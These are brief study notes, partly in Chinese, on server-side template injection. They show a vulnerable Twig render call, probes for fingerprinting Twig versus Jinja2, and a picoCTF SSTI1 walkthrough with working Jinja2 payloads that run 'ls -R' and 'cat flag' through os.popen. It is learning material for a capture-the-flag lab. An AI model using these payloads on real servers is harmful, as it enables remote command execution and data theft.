# Server-Side Template Injection

https://portswigger.net/web-security/server-side-template-injection/exploiting

對 Twig, FreeMarker 等框架做 injection

## 機制
```php
$output = $twig->render($_GET['custom_email'],  array("first_name" => $user.first_name) );
```
注入
```
custom_email={{7*7}}

49
```
### 步驟
1. 檢查 SSTI: 注入 `{{5*2}}` 看會不會回傳 `10`
2. 檢查框架
  - {{7*'7'}} would result in 49 in Twig
  - {{7*'7'}} would result in 7777777 in Jinja2
3. 

## Demo
### picoCTF SSTI1
payload
```twig
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```

result
```
.: __pycache__ app.py flag requirements.txt ./__pycache__: app.cpython-38.pyc
```
payload
```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

